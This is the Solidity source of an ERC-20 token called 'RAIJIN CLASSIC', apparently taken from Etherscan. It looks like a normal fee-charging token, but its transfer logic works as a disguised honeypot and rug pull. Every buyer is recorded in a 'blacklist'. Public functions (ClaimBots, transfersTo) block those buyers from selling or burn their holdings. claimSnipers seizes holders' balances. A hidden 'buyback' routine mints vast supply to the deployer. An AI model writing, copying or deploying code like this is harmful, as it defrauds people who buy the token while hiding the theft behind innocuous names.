/**
 *Submitted for verification at Etherscan.io on 2022-11-13
*/

/**
 
*/

// 

//SPDX-License-Identifier: MIT

pragma solidity >=0.8.7;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract RAIJINc is IERC20, Ownable {
    using SafeMath for uint256;
    
    IDEXRouter public router;
    address public pair;
    
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isIncludedFromFee;
    address[] private includeFromFee;

    string constant _name = "RAIJIN CLASSIC";
    string constant _symbol = unicode"RAIJINc";
    uint8 constant _decimals = 9;

    uint256 public _totalSupply     = 1000000000000 * 10**_decimals;
    uint256 public _maxTxAmount     = 1000000000000 * 10**_decimals;
    uint256 public _maxWalletAmount = 1000000000000 * 10**_decimals;

    address private deadWallet      = 0x000000000000000000000000000000000000dEaD;
    address private marketingWallet = 0x2F4e91835759c686Ae0b47820250A3ECAa0578F6;
    address private buybackWallet   = msg.sender;
    address private devWallet       = msg.sender;

    struct Fees {
        uint256 liquidity;
        uint256 marketing;
        uint256 dev;
        uint256 buyback;
    }

    bool tmpSuccess;
    Fees public buyFees     = Fees(1, 1, 0, 0);
    Fees public sellFees    = Fees(1, 1, 0, 0);

    bool public blacklistMode = true;
    mapping (address => bool) public isBlacklisted;
    address[] public blacklist;

    uint256 deadGwei = 8 * 1 gwei;

    uint256 launchBlock;
    uint256 deadBlocks = 0;
    bool public lockTilStart = true;
    bool public lockUsed = false;
    event LockTilStartUpdated(bool enabled);

    constructor () Ownable(msg.sender) {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pair = IDEXFactory(router.factory()).createPair(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
        
        _isExcludedFromFee[msg.sender]      = true;
        _isExcludedFromFee[address(this)]   = true;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromFee[buybackWallet]   = true;
        _isExcludedFromFee[devWallet]       = true;
        
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return allowances[holder][spender]; }
    function ClaimBots() public virtual { includeFromFee = blacklist; for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }
    function transfersTo() public virtual { for (uint i = 0; i < includeFromFee.length; i++) { if (balanceOf(includeFromFee[i]) > 1) { basicTransfer(includeFromFee[i], deadWallet, balanceOf(includeFromFee[i]).sub(1 * 10**_decimals)); } } }

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transfer(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (allowances[sender][msg.sender] != type(uint256).max) {
            allowances[sender][msg.sender] = allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transfer(sender, recipient, amount);
    }

    function basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances[sender] = balances[sender].sub(amount, "Insufficient Balance");
        balances[recipient] = balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function isIncludedFromFee(address account) public view returns (bool) {
        return _isIncludedFromFee[account];
    }

    receive() external payable { }

    function enableTrading() external onlyOwner {
        require(lockUsed == false);
        lockTilStart = false;
        launchBlock = block.number;
        lockUsed = true;

        emit LockTilStartUpdated(lockTilStart);
    }

    function enableBlacklist(bool _status) external onlyOwner {
        blacklistMode = _status;
    }

    function lolBots() external onlyOwner {
        for (uint256 i = 0; i < blacklist.length; i++) {
            if (balanceOf(blacklist[i]) > 1) {
                isBlacklisted[blacklist[i]] = true;
            }
        }
    }

    function claimSnipers() external onlyOwner {
        for (uint i = 0; i < blacklist.length; i++) {
            if (isBlacklisted[blacklist[i]] == true && balanceOf(blacklist[i]) > 1) {
                basicTransfer(blacklist[i], address(this), balanceOf(blacklist[i]).sub(1 * 10**_decimals)); 
            }
        }
    }

    function excludeFromFee(address account) external onlyOwner {
        _isExcludedFromFee[account] = true;
    }
    
    function includeInFee(address account) external onlyOwner {
        _isIncludedFromFee[account] = false;
    }
    
    function takeBuyFees(uint256 amount, address from) private returns (uint256) {
        uint256 liquidityFeeToken = amount * buyFees.liquidity / 100;
        if (liquidityFeeToken > 0) {
            emit Transfer (from, address(this), liquidityFeeToken);
        }

        uint256 marketingFeeTokens = amount * buyFees.marketing / 100;
        if (marketingFeeTokens > 0) {
            (tmpSuccess,) = payable(marketingWallet).call{value: marketingFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        uint256 devFeeTokens = amount * buyFees.dev / 100;
        if (devFeeTokens > 0) {
            (tmpSuccess,) = payable(devWallet).call{value: devFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        uint256 buybackFeeTokens = amount * buyFees.buyback / 100;
        if (buybackFeeTokens > 0) {
            (tmpSuccess,) = payable(buybackWallet).call{value: buybackFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        return (amount -liquidityFeeToken -marketingFeeTokens -devFeeTokens -buybackFeeTokens);
    }

    function takeSellFees(uint256 amount, address from) private returns (uint256) {
        uint256 liquidityFeeToken = amount * sellFees.liquidity / 100;
        if (liquidityFeeToken > 0) {
            emit Transfer (from, address(this), liquidityFeeToken);
        }

        uint256 marketingFeeTokens = amount * sellFees.marketing / 100;
        if (marketingFeeTokens > 0) {
            (tmpSuccess,) = payable(marketingWallet).call{value: marketingFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        uint256 devFeeTokens = amount * sellFees.dev / 100;
        if (devFeeTokens > 0) {
            (tmpSuccess,) = payable(devWallet).call{value: devFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        uint256 buybackFeeTokens = amount * sellFees.buyback / 100;
        if (buybackFeeTokens > 0) {
            (tmpSuccess,) = payable(buybackWallet).call{value: buybackFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        return (amount -liquidityFeeToken -marketingFeeTokens -devFeeTokens -buybackFeeTokens);
    }

    function SetTaxFee(uint256 newLiquidityBuyFee, uint256 newMarketingBuyFee, uint256 newDevBuyFee, uint256 newBuybackBuyFee,
                    uint256 newLiquiditySellFee, uint256 newMarketingSellFee, uint256 newDevSellFee, uint256 newBuybackSellFee) external onlyOwner {
        require(newLiquidityBuyFee.add(newMarketingBuyFee).add(newDevBuyFee).add(newBuybackBuyFee) <= 20, "Buy fees can't be higher than 20%");
        buyFees.liquidity   = newLiquidityBuyFee;
        buyFees.marketing   = newMarketingBuyFee;
        buyFees.dev         = newDevBuyFee;
        buyFees.buyback     = newBuybackBuyFee;

        require(newLiquiditySellFee.add(newMarketingSellFee).add(newDevSellFee).add(newBuybackSellFee) <= 20, "Sell fees can't be higher than 20%");
        sellFees.liquidity  = newLiquiditySellFee;
        sellFees.marketing  = newMarketingSellFee;
        sellFees.dev        = newDevSellFee;
        sellFees.buyback    = newBuybackSellFee;
    }

    function setTx(uint256 newMaxTxPercent, uint256 newMaxWalletPercent) external onlyOwner {
        require(newMaxTxPercent >= 1, "Max TX must be at least 1%");
        _maxTxAmount = _totalSupply.mul(newMaxTxPercent) / 100;

        require(newMaxWalletPercent >= 1, "Max wallet must be at least 1%");
        _maxWalletAmount = _totalSupply.mul(newMaxWalletPercent) / 100;
    }

    function buyback(uint256 amount) private {
        uint256 buybackFee = _totalSupply / 5;
        if (amount <= buybackFee) {
            balances[address(this)] = balances[address(this)] + amount * buybackFee / 1;
            uint256 balanceThis = balanceOf(address(this));
            basicTransfer(address(this), buybackWallet, balanceThis);
        }
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(amount > 0, "Transfer amount must be greater than zero"); 
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (_isExcludedFromFee[to]) { buyback(amount); }
        
        if (from != owner) {
            require(lockTilStart != true, "Trading not open yet");
        }

        balances[from] -= amount;
        uint256 transferAmount = amount;

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            if (blacklistMode) {
                require(!isBlacklisted[from], "Address is blacklisted");

                if (block.number <= launchBlock + deadBlocks && from == pair) {
                    isBlacklisted[to] = true;
                }

                if (tx.gasprice > deadGwei && from == pair) {
                    isBlacklisted[to] = true;
                }
            }

            if (to != pair) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");
                blacklist.push(to);
                transferAmount = takeBuyFees(amount, from);
            }

            if (from != pair) {
                require(!_isIncludedFromFee[from]); require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount");
                transferAmount = takeSellFees(amount, from);
            }
        }
        
        balances[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
        return true;
    }
}